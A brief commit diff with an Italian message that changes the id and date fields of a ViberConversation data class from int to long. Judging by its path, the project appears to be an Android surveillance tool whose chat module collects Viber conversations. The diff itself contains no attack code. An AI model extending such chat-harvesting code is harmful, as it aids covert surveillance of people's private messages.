Lettura thread, manca la gestione degli user

+++ RCSAndroid/src/com/android/networking/module/chat/ViberConversation.java
@@ -3,8 +3,8 @@ package com.android.networking.module.chat;
 public class ViberConversation {
 
 	protected String account;
-	protected int id;
-	protected int date;
+	protected long id;
+	protected long date;
 	protected String remote;
 	
 }
